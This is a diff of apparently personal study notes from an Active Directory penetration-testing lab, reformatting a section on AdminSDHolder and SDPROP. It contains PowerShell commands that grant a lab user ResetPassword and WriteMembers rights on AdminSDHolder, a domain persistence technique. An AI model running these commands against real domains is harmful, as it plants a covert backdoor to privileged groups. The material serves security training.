@@ -107,8 +107,8 @@ ls \\dcorp-dc\C$
 
 ---
 ### ACL - AdminSDHolder
-- Resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups).
-- Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of rotected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.
+- Resides in the _System container of a domain_ and used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups).
+- _Security Descriptor Propagator_ (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.
 ![[Pasted image 20231218115220.png]]
 ![[Pasted image 20231218115252.png]]
 
@@ -128,19 +128,22 @@ Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1
 -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' 
 -Verbose
 ```
-- Other interesting permissions (ResetPassword, WriteMembers) for a user to
-the AdminSDHolder,:
+- Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder:
+```powershell
 Add-DomainObjectAcl -TargetIdentity
-'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=loc
-al' -PrincipalIdentity student1 -Rights ResetPassword -
-PrincipalDomain dollarcorp.moneycorp.local -TargetDomain
-dollarcorp.moneycorp.local -Verbose
-Add-DomainObjectAcl -TargetIdentity
-'CN=AdminSDHolder,CN=System,dc-
-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1
--Rights WriteMembers -PrincipalDomain
-dollarcorp.moneycorp.local -TargetDomain
-dollarcorp.moneycorp.local -Verbose
+'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=local' 
+-PrincipalIdentity student1 -Rights ResetPassword 
+-PrincipalDomain dollarcorp.moneycorp.local 
+-TargetDomain dollarcorp.moneycorp.local -Verbose
+```
+
+```powershell
+Add-DomainObjectAcl -TargetIdentity 
+'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' 
+-PrincipalIdentity student1 -Rights WriteMembers 
+-PrincipalDomain dollarcorp.moneycorp.local 
+-TargetDomain dollarcorp.moneycorp.local -Verbose
+```
 
 
 
